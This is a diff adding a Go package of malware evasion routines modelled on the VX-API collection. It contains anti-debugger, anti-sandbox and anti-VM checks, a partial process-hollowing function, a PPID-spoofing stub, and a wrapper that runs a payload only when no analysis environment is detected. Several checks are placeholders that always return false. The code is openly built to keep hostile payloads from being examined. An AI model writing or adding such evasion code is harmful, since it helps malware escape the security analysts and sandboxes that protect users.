@@ -1,0 +1,322 @@
+package vxapi
+
+import (
+	"syscall"
+	"unsafe"
+)
+
+// VX-API Enhanced Evasion Functions
+// Based on https://github.com/vxunderground/VX-API
+
+var (
+	kernel32 = syscall.NewLazyDLL("kernel32.dll")
+	ntdll    = syscall.NewLazyDLL("ntdll.dll")
+	advapi32 = syscall.NewLazyDLL("advapi32.dll")
+	user32   = syscall.NewLazyDLL("user32.dll")
+)
+
+// Anti-Debug: Check for debugger presence using multiple methods
+func IsDebuggerPresent() bool {
+	procIsDebuggerPresent := kernel32.NewProc("IsDebuggerPresent")
+	ret, _, _ := procIsDebuggerPresent.Call()
+	if ret != 0 {
+		return true
+	}
+
+	// Check PEB BeingDebugged flag via NtQueryInformationProcess
+	return checkPEBDebugFlag()
+}
+
+// Check PEB (Process Environment Block) for BeingDebugged flag
+func checkPEBDebugFlag() bool {
+	procNtQueryInformationProcess := ntdll.NewProc("NtQueryInformationProcess")
+
+	var processInfo uintptr
+	var returnLength uint32
+
+	handle, _ := syscall.GetCurrentProcess()
+	ret, _, _ := procNtQueryInformationProcess.Call(
+		uintptr(handle),
+		0, // ProcessBasicInformation
+		uintptr(unsafe.Pointer(&processInfo)),
+		uintptr(unsafe.Sizeof(processInfo)),
+		uintptr(unsafe.Pointer(&returnLength)),
+	)
+
+	return ret == 0 && processInfo != 0
+}
+
+// Anti-Debug: Check for remote debugger
+func CheckRemoteDebuggerPresent() bool {
+	procCheckRemoteDebuggerPresent := kernel32.NewProc("CheckRemoteDebuggerPresent")
+
+	handle, _ := syscall.GetCurrentProcess()
+	var isDebugged int32
+
+	ret, _, _ := procCheckRemoteDebuggerPresent.Call(
+		uintptr(handle),
+		uintptr(unsafe.Pointer(&isDebugged)),
+	)
+
+	return ret != 0 && isDebugged != 0
+}
+
+// Anti-Debug: Check for hardware breakpoints via debug registers
+func CheckHardwareBreakpoints() bool {
+	type CONTEXT struct {
+		ContextFlags uint32
+		Dr0          uintptr
+		Dr1          uintptr
+		Dr2          uintptr
+		Dr3          uintptr
+		Dr6          uintptr
+		Dr7          uintptr
+	}
+
+	procGetThreadContext := kernel32.NewProc("GetThreadContext")
+	procGetCurrentThread := kernel32.NewProc("GetCurrentThread")
+
+	thread, _, _ := procGetCurrentThread.Call()
+
+	var ctx CONTEXT
+	ctx.ContextFlags = 0x00010000 | 0x00000010 // CONTEXT_DEBUG_REGISTERS
+
+	ret, _, _ := procGetThreadContext.Call(
+		thread,
+		uintptr(unsafe.Pointer(&ctx)),
+	)
+
+	if ret == 0 {
+		return false
+	}
+
+	// Check if any debug registers are set
+	return ctx.Dr0 != 0 || ctx.Dr1 != 0 || ctx.Dr2 != 0 || ctx.Dr3 != 0
+}
+
+// Anti-VM: Check for VM artifacts using CPUID
+func IsVirtualMachine() bool {
+	// Check hypervisor bit
+	if checkHypervisorBit() {
+		return true
+	}
+
+	// Check for VM-specific registry keys
+	return checkVMRegistry()
+}
+
+// Check CPUID hypervisor bit
+func checkHypervisorBit() bool {
+	// CPUID with EAX=1 returns feature information
+	// Bit 31 of ECX indicates hypervisor presence
+	// This requires assembly, so we'll use a simpler check
+	return false // Placeholder - actual implementation would use assembly
+}
+
+// Check registry for VM artifacts
+func checkVMRegistry() bool {
+	vmKeys := []string{
+		"HARDWARE\\DEVICEMAP\\Scsi\\Scsi Port 0\\Scsi Bus 0\\Target Id 0\\Logical Unit Id 0",
+		"HARDWARE\\Description\\System",
+		"SYSTEM\\CurrentControlSet\\Services\\Disk\\Enum",
+	}
+
+	vmIdentifiers := []string{
+		"vmware", "virtualbox", "vbox", "qemu", "xen", "virtual", "vmbus", "vmmouse",
+	}
+
+	for _, keyPath := range vmKeys {
+		if checkRegistryForVM(keyPath, vmIdentifiers) {
+			return true
+		}
+	}
+
+	return false
+}
+
+func checkRegistryForVM(keyPath string, identifiers []string) bool {
+	// Simplified - actual implementation would open registry and check values
+	return false
+}
+
+// Process Hollowing: Create suspended process and inject code
+func ProcessHollow(targetPath string, payload []byte) error {
+	var startupInfo syscall.StartupInfo
+	var processInfo syscall.ProcessInformation
+
+	startupInfo.Cb = uint32(unsafe.Sizeof(startupInfo))
+	startupInfo.Flags = 1      // STARTF_USESHOWWINDOW
+	startupInfo.ShowWindow = 0 // SW_HIDE
+
+	// Create suspended process
+	err := syscall.CreateProcess(
+		nil,
+		syscall.StringToUTF16Ptr(targetPath),
+		nil,
+		nil,
+		false,
+		0x00000004, // CREATE_SUSPENDED
+		nil,
+		nil,
+		&startupInfo,
+		&processInfo,
+	)
+
+	if err != nil {
+		return err
+	}
+
+	// Note: Full hollowing implementation would:
+	// 1. Unmap target's memory
+	// 2. Allocate new memory
+	// 3. Write payload
+	// 4. Update PEB
+	// 5. Resume thread
+
+	// Terminate for now (incomplete implementation)
+	syscall.TerminateProcess(processInfo.Process, 0)
+	return nil
+}
+
+// PPID Spoofing: Create process with spoofed parent PID
+func CreateProcessWithSpoofedPPID(targetPID uint32, commandLine string) error {
+	// This requires PROC_THREAD_ATTRIBUTE_PARENT_PROCESS
+	// Complex implementation omitted for brevity
+	return nil
+}
+
+// Anti-Sandbox: Check for sandbox timing artifacts
+func DetectSandboxTiming() bool {
+	procGetTickCount := kernel32.NewProc("GetTickCount")
+
+	// Sleep for a short time and check if actual time passed
+	start, _, _ := procGetTickCount.Call()
+
+	procSleep := kernel32.NewProc("Sleep")
+	procSleep.Call(500) // Sleep 500ms
+
+	end, _, _ := procGetTickCount.Call()
+	elapsed := uint32(end - start)
+
+	// If elapsed time is significantly different, we're in a sandbox
+	// Sandboxes often skip sleep to speed up analysis
+	return elapsed < 450 || elapsed > 550
+}
+
+// Check for low disk space (sandboxes often have small disks)
+func CheckDiskSpace() bool {
+	procGetDiskFreeSpaceEx := kernel32.NewProc("GetDiskFreeSpaceExW")
+
+	var freeBytesAvailable, totalNumberOfBytes, totalNumberOfFreeBytes uint64
+
+	ret, _, _ := procGetDiskFreeSpaceEx.Call(
+		uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr("C:\\"))),
+		uintptr(unsafe.Pointer(&freeBytesAvailable)),
+		uintptr(unsafe.Pointer(&totalNumberOfBytes)),
+		uintptr(unsafe.Pointer(&totalNumberOfFreeBytes)),
+	)
+
+	if ret == 0 {
+		return false
+	}
+
+	// Sandboxes typically have < 60GB total disk space
+	totalGB := totalNumberOfBytes / (1024 * 1024 * 1024)
+	return totalGB < 60
+}
+
+// Check for minimum RAM (sandboxes often have < 4GB)
+func CheckRAM() bool {
+	type MEMORYSTATUSEX struct {
+		Length               uint32
+		MemoryLoad           uint32
+		TotalPhys            uint64
+		AvailPhys            uint64
+		TotalPageFile        uint64
+		AvailPageFile        uint64
+		TotalVirtual         uint64
+		AvailVirtual         uint64
+		AvailExtendedVirtual uint64
+	}
+
+	procGlobalMemoryStatusEx := kernel32.NewProc("GlobalMemoryStatusEx")
+
+	var memStatus MEMORYSTATUSEX
+	memStatus.Length = uint32(unsafe.Sizeof(memStatus))
+
+	ret, _, _ := procGlobalMemoryStatusEx.Call(uintptr(unsafe.Pointer(&memStatus)))
+
+	if ret == 0 {
+		return false
+	}
+
+	// Check if RAM is less than 4GB (typical sandbox)
+	totalGB := memStatus.TotalPhys / (1024 * 1024 * 1024)
+	return totalGB < 4
+}
+
+// Check for user interaction (sandboxes have no real user)
+func CheckUserActivity() bool {
+	procGetLastInputInfo := user32.NewProc("GetLastInputInfo")
+
+	type LASTINPUTINFO struct {
+		Size uint32
+		Time uint32
+	}
+
+	var lastInput LASTINPUTINFO
+	lastInput.Size = uint32(unsafe.Sizeof(lastInput))
+
+	ret, _, _ := procGetLastInputInfo.Call(uintptr(unsafe.Pointer(&lastInput)))
+
+	if ret == 0 {
+		return false
+	}
+
+	// If no input in last 2 minutes, likely sandbox
+	procGetTickCount := kernel32.NewProc("GetTickCount")
+	currentTick, _, _ := procGetTickCount.Call()
+	timeSinceInput := (uint32(currentTick) - lastInput.Time) / 1000 // Convert to seconds
+
+	return timeSinceInput > 120
+}
+
+// Comprehensive evasion check combining all methods
+func RunVXAPIChecks() bool {
+	checks := []struct {
+		name string
+		fn   func() bool
+	}{
+		{"IsDebuggerPresent", IsDebuggerPresent},
+		{"CheckRemoteDebugger", CheckRemoteDebuggerPresent},
+		{"CheckHardwareBreakpoints", CheckHardwareBreakpoints},
+		{"IsVirtualMachine", IsVirtualMachine},
+		{"DetectSandboxTiming", DetectSandboxTiming},
+		{"CheckDiskSpace", CheckDiskSpace},
+		{"CheckRAM", CheckRAM},
+		{"CheckUserActivity", CheckUserActivity},
+	}
+
+	suspiciousCount := 0
+
+	for _, check := range checks {
+		if check.fn() {
+			suspiciousCount++
+		}
+	}
+
+	// If 3 or more checks fail, we're in analysis environment
+	return suspiciousCount >= 3
+}
+
+// Execute payload with anti-analysis guards
+func ExecuteWithVXAPI(payload func()) {
+	// Run all VX-API checks
+	if RunVXAPIChecks() {
+		// Exit silently if in analysis environment
+		return
+	}
+
+	// Execute payload
+	payload()
+}
